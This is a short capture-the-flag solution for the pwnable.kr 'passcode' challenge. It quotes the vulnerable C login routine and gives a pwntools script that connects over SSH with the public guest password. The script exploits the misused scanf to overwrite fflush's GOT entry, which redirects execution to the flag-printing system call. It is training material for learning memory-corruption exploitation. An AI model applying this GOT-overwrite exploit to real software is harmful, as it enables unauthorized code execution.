"""
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
    scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
        printf("Login OK!\n");
        system("/bin/cat flag");
    }
    else{
        printf("Login Failed!\n");
	exit(0);
    }
}
"""

from pwn import *

ssh = ssh("passcode", "pwnable.kr", password="guest", port=2222)

p = ssh.process(executable="./passcode", argv=["passcode"])

# sets up the first scanf call to write our input to the fflush got memory address
name = b'A' * 96        # fill up until the last 4 bytes
name += p32(0x804a004)  # the got table addr of fflush

pass1 = '134514147'.encode()  # instruction that sets up the registers and calls system('/bin/cat flag') as str

p.sendline(name)

p.clean()
p.clean()

p.sendline(pass1)

print(p.recvall())

p.close()

ssh.close()